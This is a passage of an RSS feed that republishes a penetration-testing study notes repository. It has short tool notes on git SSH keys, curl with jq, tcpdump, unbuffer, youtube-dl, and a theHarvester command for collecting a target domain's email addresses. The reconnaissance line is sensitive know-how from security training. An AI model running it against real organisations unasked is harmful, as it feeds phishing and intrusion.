class=&quot;va&quot;&gt;$COMMAND&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With KeePassXC or a GPG authentication subkey referenced using a public $KEY_FILE:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;GIT_SSH_COMMAND=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;ssh -i &lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$KEY_FILE&lt;/span&gt;&lt;span class=&quot;st&quot;&gt; -F /dev/null&amp;quot;&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;git&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$COMMAND&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;via-a-config-directive&quot;&gt;Via a Config Directive&lt;/h2&gt;&lt;p&gt;With a secret SSH key:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;git&lt;/span&gt; config core.sshCommand &lt;span class=&quot;st&quot;&gt;&amp;quot;ssh -i &lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$PUBLIC_KEY_FILE&lt;/span&gt;&lt;span class=&quot;st&quot;&gt; -F /dev/null -o IdentityAgent=none&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With KeePassXC or a GPG authentication subkey referenced using a public $KEY_FILE:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb5-1&quot;&gt;&lt;a href=&quot;#cb5-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;git&lt;/span&gt; config core.sshCommand &lt;span class=&quot;st&quot;&gt;&amp;quot;ssh -i &lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$PUBLIC_KEY_FILE&lt;/span&gt;&lt;span class=&quot;st&quot;&gt; -F /dev/null&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is useful for ongoing work, but only works on existing repositories.&lt;/p&gt;</description>
			<pubDate>Fri, 14 Apr 2023 03:01:33 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Use%20an%20Alternate%20SSH%20Key%20with%20Git.md</guid>
		</item>
		<item>
			<title>Using "curl" and "jq" with Web APIs</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22curl%22%20and%20%22jq%22%20with%20Web%20APIs.md</link>
			<description>&lt;p&gt;You can query web APIs easily with cURL. If the API endpoint accepts GET requests, then this is as simple as:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;curl&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;https://web.site/?parameter1=value1&amp;amp;parameter2=value2&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;(The quotes are important here so that your shell doesn't interpret &lt;code&gt;&amp;amp;&lt;/code&gt; as a request to background curl!)&lt;/p&gt;&lt;p&gt;For APIs that use GET/POST/PUT/etc. request types, combine the &lt;code&gt;-d&lt;/code&gt; (data) and &lt;code&gt;-X&lt;/code&gt; (request type) parameters:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;curl&lt;/span&gt; -X POST &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;parameter1=value1&amp;amp;parameter2=value2&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;st&quot;&gt;&amp;quot;https://web.site/&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;-d&lt;/code&gt; parameter can also be specified multiple times (mostly for readability), in which case you'd normally want to have a single parameter/value pair for each instance.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;curl&lt;/span&gt; -X POST &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;parameter1=value1&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;parameter2=value2&amp;quot;&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;https://web.site/&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;By default, cURL sends data with the &lt;code&gt;Content-Type: application/x-www-form-urlencoded&lt;/code&gt;. If you need to change the content type (for example, you frequently need to send &lt;code&gt;Content-Type: application/json&lt;/code&gt; with JSON data) or need to specify additional headers (frequently for authentication), then you can use the &lt;code&gt;-H&lt;/code&gt; (header) parameter.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;curl&lt;/span&gt; -X POST &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-2&quot;&gt;&lt;a href=&quot;#cb4-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;User-Token: XXXXXX&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-3&quot;&gt;&lt;a href=&quot;#cb4-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;parameter1=value1&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-4&quot;&gt;&lt;a href=&quot;#cb4-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;parameter2=value2&amp;quot;&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;https://web.site/&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Like &lt;code&gt;-d&lt;/code&gt;, the &lt;code&gt;-H&lt;/code&gt; parameter can be specified multiple times for multiple headers, and will smartly override cURL's defaults.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb5-1&quot;&gt;&lt;a href=&quot;#cb5-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;curl&lt;/span&gt; -X POST &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-2&quot;&gt;&lt;a href=&quot;#cb5-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;User-Token: XXXXXX&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-3&quot;&gt;&lt;a href=&quot;#cb5-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;Username: My User&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-4&quot;&gt;&lt;a href=&quot;#cb5-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;parameter1=value1&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-5&quot;&gt;&lt;a href=&quot;#cb5-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;parameter2=value2&amp;quot;&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;https://web.site/&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Because responses are often served up in a compact fashion, they're often a bit hard to read. The &lt;code&gt;jq&lt;/code&gt; command's default filter (&lt;code&gt;.&lt;/code&gt;) just pretty-prints (and colorizes!) JSON, which can make interpreting the API's response much easier.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb6&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb6-1&quot;&gt;&lt;a href=&quot;#cb6-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;curl&lt;/span&gt; -X POST &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-2&quot;&gt;&lt;a href=&quot;#cb6-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;User-Token: XXXXXX&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-3&quot;&gt;&lt;a href=&quot;#cb6-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;Username: My User&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-4&quot;&gt;&lt;a href=&quot;#cb6-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;parameter1=value1&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-5&quot;&gt;&lt;a href=&quot;#cb6-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;parameter2=value2&amp;quot;&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;https://web.site/&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;jq&lt;/span&gt; .&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.educative.io/edpresso/how-to-perform-a-post-request-using-curl&quot;&gt;How to perform a POST request using Curl&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;relevant-man-page-excerpts&quot;&gt;Relevant Man Page Excerpts&lt;/h2&gt;&lt;h3 id=&quot;curl&quot;&gt;cURL&lt;/h3&gt;&lt;blockquote&gt;&lt;p&gt;&lt;code&gt;-d&lt;/code&gt;, &lt;code&gt;--data DATA&lt;/code&gt; (HTTP) Sends the specified data in a POST request to the HTTP server, in the same way that a browser does when a user has filled in an HTML form and presses the submit button. This will cause curl to pass the data to the server using the content-type &lt;code&gt;application/x-www-form-urlencoded&lt;/code&gt;. Compare to &lt;code&gt;-F&lt;/code&gt;, &lt;code&gt;--form&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;&lt;code&gt;--data-raw&lt;/code&gt; is almost the same but does not have a special interpretation of the @ character. To post data purely binary, you should instead use the &lt;code&gt;--data-binary&lt;/code&gt; option. To URL-encode the value of a form field you may use &lt;code&gt;--data-urlencode&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;If any of these options is used more than once on the same command line, the data pieces specified will be merged together with a separating &amp;amp;-symbol. Thus, using &lt;code&gt;-d name=daniel -d skill=lousy&lt;/code&gt; would generate a post chunk that looks like &lt;code&gt;name=daniel&amp;amp;skill=lousy&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;If you start the data with the letter @, the rest should be a file name to read the data from, or - if you want curl to read the data from stdin. Multiple files can also be specified. Posting data from a file named &lt;code&gt;foobar&lt;/code&gt; would thus be done with &lt;code&gt;-d&lt;/code&gt;, &lt;code&gt;--data @foobar&lt;/code&gt;. When &lt;code&gt;--data&lt;/code&gt; is told to read from a file like that, carriage returns and newlines will be stripped out. If you don't want the @ character to have a special interpretation use &lt;code&gt;--data-raw&lt;/code&gt; instead.&lt;/p&gt;&lt;p&gt;&lt;code&gt;-H&lt;/code&gt;, &lt;code&gt;--header HEADER/@FILE&lt;/code&gt; (HTTP) Extra header to include in the request when sending HTTP to a server. You may specify any number of extra headers. Note that if you should add a custom header that has the same name as one of the internal ones curl would use, your externally set header will be used instead of the internal one. This allows you to make even trickier stuff than curl would normally do. You should not replace internally set headers without knowing perfectly well what you're doing. Remove an internal header by giving a replacement without content on the right side of the colon, as in: &lt;code&gt;-H &quot;Host:&quot;&lt;/code&gt;. If you send the custom header with no-value then its header must be terminated with a semicolon, such as &lt;code&gt;-H &quot;X-Custom-Header;&quot;&lt;/code&gt; to send &lt;code&gt;&quot;X-Custom-Header:&quot;&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;curl will make sure that each header you add/replace is sent with the proper end-of-line marker, you should thus not add that as a part of the header content: do not add newlines or carriage returns, they will only mess things up for you.&lt;/p&gt;&lt;p&gt;Starting in 7.55.0, this option can take an argument in @filename style, which then adds a header for each line in the input file. Using @- will make curl read the header file from stdin.&lt;/p&gt;&lt;p&gt;See also the &lt;code&gt;-A&lt;/code&gt;, &lt;code&gt;--user-agent&lt;/code&gt; and &lt;code&gt;-e&lt;/code&gt;, &lt;code&gt;--referer&lt;/code&gt; options.&lt;/p&gt;&lt;p&gt;Starting in 7.37.0, you need &lt;code&gt;--proxy-header&lt;/code&gt; to send custom headers intended for a proxy.&lt;/p&gt;&lt;p&gt;Example:&lt;/p&gt;&lt;p&gt;&lt;code&gt;curl -H &quot;X-First-Name: Joe&quot; http://example.com/&lt;/code&gt;&lt;/p&gt;&lt;p&gt;WARNING: headers set with this option will be set in all requests - even after redirects are followed, like when told with &lt;code&gt;-L&lt;/code&gt;, &lt;code&gt;--location&lt;/code&gt;. This can lead to the header being sent to other hosts than the original host, so sensitive headers should be used with caution combined with following redirects.&lt;/p&gt;&lt;p&gt;This option can be used multiple times to add/replace/remove multiple headers.&lt;/p&gt;&lt;p&gt;&lt;code&gt;-X&lt;/code&gt;, &lt;code&gt;--request COMMAND&lt;/code&gt; (HTTP) Specifies a custom request method to use when communicating with the HTTP server. The specified request method will be used instead of the method otherwise used (which defaults to GET). Read the HTTP 1.1 specification for details and explanations. Common additional HTTP requests include PUT and DELETE, but related technologies like WebDAV offers PROPFIND, COPY, MOVE and more.&lt;/p&gt;&lt;p&gt;Normally you don't need this option. All sorts of GET, HEAD, POST and PUT requests are rather invoked by using dedicated command line options.&lt;/p&gt;&lt;p&gt;This option only changes the actual word used in the HTTP request, it does not alter the way curl behaves. So for example if you want to make a proper HEAD request, using -X HEAD will not suffice. You need to use the &lt;code&gt;-I&lt;/code&gt;, &lt;code&gt;--head&lt;/code&gt; option.&lt;/p&gt;&lt;p&gt;The method string you set with &lt;code&gt;-X&lt;/code&gt;, &lt;code&gt;--request&lt;/code&gt; will be used for all requests, which if you for example use &lt;code&gt;-L&lt;/code&gt;, &lt;code&gt;--location&lt;/code&gt; may cause unintended side-effects when curl doesn't change request method according to the HTTP 30x response codes - and similar.&lt;/p&gt;&lt;/blockquote&gt;&lt;h3 id=&quot;jq&quot;&gt;jq&lt;/h3&gt;&lt;blockquote&gt;&lt;p&gt;BASIC FILTERS&lt;/p&gt;&lt;p&gt;Identity: &lt;code&gt;.&lt;/code&gt; The absolute simplest filter is &lt;code&gt;.&lt;/code&gt;. This is a filter that takes its input and produces it unchanged as output. That is, this is the identity operator.&lt;/p&gt;&lt;p&gt;Since jq by default pretty-prints all output, this trivial program can be a useful way of formatting JSON output from, say, curl.&lt;/p&gt;&lt;/blockquote&gt;</description>
			<pubDate>Fri, 14 Apr 2023 03:01:33 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22curl%22%20and%20%22jq%22%20with%20Web%20APIs.md</guid>
		</item>
		<item>
			<title>Using "tcpdump"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22tcpdump%22.md</link>
			<description>&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Quick-n-dirty packet capture&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; tcpdump port &lt;span class=&quot;va&quot;&gt;$PORT_TO_FILTER_ON&lt;/span&gt; -A&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;-A&lt;/code&gt; flag prints packet contents in ASCII. Wireshark is obviously nicer.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/jrpenetrationtester&quot;&gt;TryHackMe: Jr. Penetration Tester&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Fri, 14 Apr 2023 03:01:33 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22tcpdump%22.md</guid>
		</item>
		<item>
			<title>Using "unbuffer"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22unbuffer%22.md</link>
			<description>&lt;p&gt;Normally application output is printed to STDOUT whenever a newline is encountered (&quot;line buffering&quot;). However, line buffering is disabled when piping to another application. This is particularly annoying, for example, when piping the output of an application to &lt;code&gt;tee&lt;/code&gt; in order to both observe &lt;em&gt;and&lt;/em&gt; save it to a log.&lt;/p&gt;&lt;p&gt;The &lt;code&gt;unbuffer&lt;/code&gt; command restores line buffering in pipes. Use like so:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;unbuffer&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$APPLICATION&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;tee&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$LOG&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/questions/11337041/force-line-buffering-of-stdout-in-a-pipeline#comment111940075_11337310&quot;&gt;Force line-buffering of stdout in a pipeline&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Fri, 14 Apr 2023 03:01:33 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22unbuffer%22.md</guid>
		</item>
		<item>
			<title>Using The Harvester</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20The%20Harvester.md</link>
			<description>&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;theHarvester&lt;/span&gt; -d &lt;span class=&quot;va&quot;&gt;$EMAIL_DOMAIN&lt;/span&gt; -b &lt;span class=&quot;va&quot;&gt;$SERVICE_TO_SEARCH&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.offensive-security.com/offsec/offsec-live/&quot;&gt;OffSec Live&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Fri, 14 Apr 2023 03:01:33 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20The%20Harvester.md</guid>
		</item>
		<item>
			<title>Using "youtube-dl"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20%22youtube-dl%22.md</link>
			<description>&lt;p&gt;You can download video and audio files for offline viewing from a variety of websites using youtube-dl. Be sure to install ffmpeg as well for tagging.&lt;/p&gt;&lt;p&gt;To grab an HD MP4 (720p or the next best &lt;em&gt;larger&lt;/em&gt; size), use the following command (works well on YouTube):&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;youtube-dl&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;--output&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;%(title)s (%(id)s).%(ext)s&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;--format&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;bestvideo[width&amp;lt;=1280][height&amp;gt;540][ext=mp4]+bestaudio[ext=m4a]/bestvideo[width&amp;lt;=1920][height&amp;gt;720][ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;--add-metadata&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$URL&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Useful size specs:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;480p: 854x480 (ish) - DVD quality&lt;/li&gt;&lt;li&gt;540p: 960x540 (ish) - quarter HD, pretty uncommon (except on VHX)&lt;/li&gt;&lt;li&gt;720p: 1280x720 (ish) - often just called &quot;HD&quot;&lt;/li&gt;&lt;li&gt;1080p: 1920x1080 (ish) - often called &quot;full HD&quot;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Most of the time, you'll need a newer version of youtube-dl than is available in your distro's repos. You can grab the latest youtube-dl source code from GitHub, or alternately install with pip. I prefer to do this in a Python virtual environment, though it still can help to pull in the system package (to ensure that you have all of the right dependencies).&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;virtualenv&lt;/span&gt; youtube-dl&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;cd&lt;/span&gt; youtube-dl&lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;bin/activate&lt;/span&gt;&lt;/span&gt;
